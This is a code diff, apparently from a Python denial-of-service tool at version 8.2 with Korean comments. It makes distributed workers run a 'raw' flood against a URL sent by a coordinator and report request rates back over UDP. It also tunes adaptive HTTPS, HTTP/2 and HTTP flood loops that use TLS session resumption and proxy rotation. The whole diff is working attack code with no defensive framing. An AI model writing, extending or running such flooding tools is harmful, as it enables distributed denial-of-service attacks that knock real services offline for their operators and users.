@@ -597,30 +597,66 @@ def _dist_worker(port, duration):
         sock.close()
         return
     
-    # Execute the attack (call main attack logic)
+    # Execute the attack (v8.2: 실제로 공격 실행)
     url = attack_cmd.get('url', _DIST_URL[0])
     mode = attack_cmd.get('mode', 'auto')
     dur = attack_cmd.get('duration', _DIST_DURATION[0])
     
-    # Report stats every 1 second
+    print(f"[dist-worker] attacking: {url} mode={mode} duration={dur}s", file=sys.stderr)
+    
+    # Run the attack in a separate thread so we can report stats
+    import threading
+    import asyncio
+    
+    attack_stats = {'requests': 0, 'packets': 0, 'errors': 0}
+    
+    def _run_attack():
+        """Worker가 실제로 공격을 실행."""
+        try:
+            # Use the main attack logic
+            # Stats class is defined in this file (line 903)
+            stats = Stats()
+            
+            # Call run() with raw mode
+            # run is async, so we need to run it in an event loop
+            loop = asyncio.new_event_loop()
+            asyncio.set_event_loop(loop)
+            try:
+                # Run the attack (raw mode, 4 threads)
+                _ADAPTIVE[0] = False  # Disable adaptive in worker (coordinator handles it)
+                loop.run_until_complete(
+                    run(['raw'], url, 50, dur, stats, 0, None, None)
+                )
+            finally:
+                loop.close()
+            
+            attack_stats['requests'] = stats.requests
+            attack_stats['packets'] = stats.packets
+            attack_stats['errors'] = stats.errors
+        except Exception as e:
+            print(f"[dist-worker] attack error: {e}", file=sys.stderr)
+            attack_stats['errors'] += 1
+    
+    attack_thread = threading.Thread(target=_run_attack, daemon=True)
+    attack_thread.start()
+    
+    # Report stats every 1 second while attack is running
     stats_end = _time.time() + dur
     last_report = 0
-    last_req = 0
     
-    while _time.time() < stats_end:
+    while _time.time() < stats_end and attack_thread.is_alive():
         if coordinator_addr:
             try:
                 now = _time.time()
                 if now - last_report >= 1.0:
                     # Calculate RPS since last report
-                    # (stats object is global, but in worker mode we use _DIST_STATS)
-                    rps = _DIST_STATS['rps']  # Simplified: use aggregate
+                    rps = attack_stats['requests'] / max(0.1, now - (stats_end - dur))
                     stats_msg = {
                         "type": "stats",
                         "id": _DIST_ID[0],
-                        "rps": rps,
-                        "packets": _DIST_STATS['packets'],
-                        "errors": _DIST_STATS['errors'],
+                        "rps": int(rps),
+                        "packets": attack_stats['packets'],
+                        "errors": attack_stats['errors'],
                     }
                     sock.sendto(_json.dumps(stats_msg).encode(), coordinator_addr)
                     last_report = now
@@ -629,6 +665,24 @@ def _dist_worker(port, duration):
         
         _time.sleep(0.1)
     
+    # Wait for attack to finish (max 5 seconds)
+    attack_thread.join(timeout=5.0)
+    
+    # Final stats report
+    if coordinator_addr:
+        try:
+            final_msg = {
+                "type": "stats",
+                "id": _DIST_ID[0],
+                "rps": 0,
+                "packets": attack_stats['packets'],
+                "errors": attack_stats['errors'],
+            }
+            sock.sendto(_json.dumps(final_msg).encode(), coordinator_addr)
+        except Exception:
+            pass
+    
+    print(f"[dist-worker] done: requests={attack_stats['requests']}, errors={attack_stats['errors']}", file=sys.stderr)
     sock.close()
 
 def _adaptive_adjust(response_time_ms, now=None):
@@ -1119,10 +1173,15 @@ def _mp_https_flood(args_tuple):
             if not data:
                 break
             sent += 1
-            # v8.1: 적응형 공격 - 응답 시간 측정 + RPS 조절
+            # v8.1/v8.2: 적응형 공격 - 응답 시간 측정 + RPS 조절 + 실제 sleep
             if _ADAPTIVE[0]:
                 _resp_ms = (_t_recv - _t_send) * 1000.0
                 _adaptive_adjust(_resp_ms, _t_recv)
+                # v8.2: rps_mult로 실제 sleep
+                _mult = _ADAPTIVE_STATE['rps_mult']
+                if _mult < 0.95:
+                    _sleep_time = (1.0 / _mult - 1.0) * 0.001
+                    _time.sleep(min(_sleep_time, 0.5))
         except Exception:
             # Reconnect with 0-RTT if session cached
             if cached_session is not None:
@@ -1886,11 +1945,16 @@ def _mp_h2_flood(args_tuple):
                                 pass  # just drain
                     except _socket.timeout:
                         break
-                # v8.1: 적응형 공격 - 응답 시간 측정 + RPS 조절
+                # v8.1/v8.2: 적응형 공격 - 응답 시간 측정 + RPS 조절 + 실제 sleep
                 _t_recv = _time.time()
                 if _ADAPTIVE[0]:
                     _resp_ms = (_t_recv - _t_send) * 1000.0
                     _adaptive_adjust(_resp_ms, _t_recv)
+                    # v8.2: rps_mult로 실제 sleep
+                    _mult = _ADAPTIVE_STATE['rps_mult']
+                    if _mult < 0.95:
+                        _sleep_time = (1.0 / _mult - 1.0) * 0.001
+                        _time.sleep(min(_sleep_time, 0.5))
             except Exception:
                 break
         ssock.close()
@@ -2356,10 +2420,15 @@ def _mp_http_send(args_tuple):
             if not data:
                 break
             sent += 1
-            # v5.2: 적응형 공격 - 응답 시간 측정 + RPS 조절
+            # v5.2/v8.2: 적응형 공격 - 응답 시간 측정 + RPS 조절 + 실제 sleep
             if _ADAPTIVE[0]:
                 _resp_ms = (_t_recv - _t_send) * 1000.0
                 _adaptive_adjust(_resp_ms, _t_recv)
+                # v8.2: rps_mult로 실제 sleep (0.5x = 2배 느리게)
+                _mult = _ADAPTIVE_STATE['rps_mult']
+                if _mult < 0.95:  # Only sleep if we're throttling
+                    _sleep_time = (1.0 / _mult - 1.0) * 0.001  # Convert to seconds
+                    _time.sleep(min(_sleep_time, 0.5))  # Max 500ms per request
             # v5.1: 매 N개 요청마다 프록시 자동轮换 (keep-alive 구간에서도)
             if proxy_pool and len(proxy_pool) > 0:
                 req_since_rotate += 1
